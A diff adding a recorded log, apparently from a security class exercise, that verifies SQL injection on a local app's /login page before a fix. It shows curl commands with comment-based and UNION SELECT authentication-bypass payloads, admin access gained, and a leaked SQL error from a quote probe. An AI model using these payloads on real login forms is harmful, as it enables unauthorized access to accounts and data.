@@ -1,0 +1,15 @@
+== Part 1: SQL injection on /login (pre-fix HEAD, http://localhost:8081) ==
+Recorded: 2026-11-17 09:34:22 Europe/Paris
+
+$ curl.exe -s -c admin-prefix.jar --data-urlencode "username=admin' -- " --data-urlencode "password=anything" http://localhost:8081/login -o NUL -w "%{http_code}"
+HTTP 200
+GET /admin with that cookie -> HTTP 302
+
+$ curl.exe -s -c admin-union.jar --data-urlencode "username=zzz' UNION SELECT 1,'admin','admin','anything' -- " --data-urlencode "password=anything" http://localhost:8081/login -o NUL -w "%{http_code}"
+HTTP 302
+GET /admin with that cookie -> HTTP 200 ; h1: Users
+
+Error leak probe: username = ' (a single quote)
+login page body contains -> Query error: unterminated quoted string at or near &#34;&#39;&#39;&#39;&#34; LINE 1: ...id, username, role, password FROM users WHERE username = &#39;&#39;&#39;                                                                     ^ 
+
+Jars kept outside the repository: C:\Users\86150\AppData\Local\Temp\class9_admin_prefix.jar , C:\Users\86150\AppData\Local\Temp\class9_admin_union.jar
